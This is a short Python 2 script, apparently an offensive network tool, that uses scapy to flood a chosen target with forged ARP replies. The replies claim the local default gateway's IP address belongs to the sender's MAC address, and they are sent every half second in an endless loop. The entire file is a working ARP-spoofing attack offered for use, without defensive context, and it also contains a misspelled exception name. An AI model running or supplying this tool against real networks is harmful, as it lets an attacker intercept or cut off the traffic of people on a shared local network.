#!/usr/bin/env python

from scapy.all import *
from time import sleep
import time
import sys, os, re, commands

def arpflood():
    interface = raw_input("Input egress interface:")
    conf.iface = interface

    target = raw_input("Input target IP:")
    target = target

    arp_paket = ARP()

    # IP Gateway
    gw = commands.getoutput("ip route list | grep default").split()[2][0:]
    arp_paket.psrc = gw

    #IP Victim
    arp_paket.pdst = target

    #Mac
    mac = commands.getoutput("ifconfig eth0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'")
    arp_paket.hwsrc = mac

    sleep(3)
    print '================================================'
    print "[+] Interface              : " + interface
    print "[+] Gateway's IP Address   : " + gw
    print "[+] Your Mac Address       : " + mac
    print "[+] Target\'s IP Address   : " + target
    print '================================================'
    sleep(3)

    print '''
    ARP Flooding ...
    '''
    try:
        while 1:
            send(arp_paket, verbose=0)
            sleep(0.5)
    except:
        print 'Exception error'

if __name__ == '__main__':
    try:
        arpflood()
    except KeyBoardInterrupt:
        print 'KeyBoardInterrupt exception'
